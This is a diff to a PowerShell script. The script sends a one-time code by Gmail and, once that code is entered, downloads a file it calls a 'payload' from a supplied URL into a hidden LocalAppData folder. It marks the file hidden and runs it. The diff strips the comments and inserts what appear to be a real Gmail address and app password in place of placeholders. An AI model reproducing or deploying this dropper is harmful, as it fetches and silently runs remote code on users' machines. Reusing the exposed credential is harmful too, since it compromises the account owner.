@@ -20,7 +20,6 @@ param (
 # Step 0: Two-Step Verification (Email OTP)
 # -------------------------------------------------------------------------
 
-# Generate a cryptographically random 6-digit numeric OTP
 $otp = (Get-Random -Minimum 100000 -Maximum 999999).ToString()
 
 function Send-VerificationOtp {
@@ -29,11 +28,10 @@ function Send-VerificationOtp {
         [string]$Code
     )
 
-    # SMTP Configuration (Requires a Gmail account with an App Password)
-    $smtpServer = "smtp.gmail.com"
-    $smtpPort   = 587
-    $senderUser = "YOUR_SENDER_EMAIL@gmail.com"     # The sending Gmail account
-    $appPassword = "YOUR_16_DIGIT_APP_PASSWORD"     # Generated Gmail App Password
+    $smtpServer  = "smtp.gmail.com"
+    $smtpPort    = 587
+    $senderUser  = "jeffersonlakashiang@gmail.com"
+    $appPassword = "tajeiwqogtmlfcps"
 
     $mailMessage = New-Object System.Net.Mail.MailMessage
     $mailMessage.From = New-Object System.Net.Mail.MailAddress($senderUser, "Script Authorization")
@@ -67,10 +65,8 @@ This code is valid for this session only. If you did not initiate this request, 
 }
 
 try {
-    # Dispatch OTP
     Send-VerificationOtp -RecipientEmail $NotifyEmail -Code $otp
 
-    # Prompt user for code with 3 attempts
     $authenticated = $false
     $maxAttempts = 3
     $attempts = 0
@@ -100,16 +96,13 @@ catch {
 # Step 1: Payload Download & Execution (Runs only if verified)
 # -------------------------------------------------------------------------
 
-# 1. Enforce TLS 1.2+ negotiation for GitHub endpoints
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-# 2. Construct paths targeting a hidden subfolder in LocalAppData
 $basePath        = $env:LOCALAPPDATA
 $targetDirectory = Join-Path -Path $basePath -ChildPath $FolderName
 $destinationPath = Join-Path -Path $targetDirectory -ChildPath $FileName
 
 try {
-    # 3. Create target directory if it does not already exist
     if (-not (Test-Path -LiteralPath $targetDirectory)) {
         $folder = New-Item -Path $targetDirectory -ItemType Directory -Force -ErrorAction Stop
         $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden
@@ -118,7 +111,6 @@ try {
 
     Write-Host "Downloading payload from $Url..." -ForegroundColor Cyan
 
-    # 4. Download file directly with strict error termination
     $webParams = @{
         Uri             = $Url
         OutFile         = $destinationPath
@@ -128,7 +120,6 @@ try {
     }
     Invoke-WebRequest @webParams
 
-    # 5. Validate file integrity and size
     if (-not (Test-Path -LiteralPath $destinationPath)) {
         throw "File download failed; target destination does not exist."
     }
@@ -138,11 +129,9 @@ try {
         throw "Downloaded payload is empty (0 bytes)."
     }
 
-    # 6. Apply Hidden attribute to the downloaded batch file
     $fileItem.Attributes = $fileItem.Attributes -bor [System.IO.FileAttributes]::Hidden
     Write-Host "Payload saved and flagged as Hidden: $destinationPath" -ForegroundColor Green
 
-    # 7. Execute the batch file
     Write-Host "Launching process..." -ForegroundColor Cyan
     $processParams = @{
         FilePath = $destinationPath
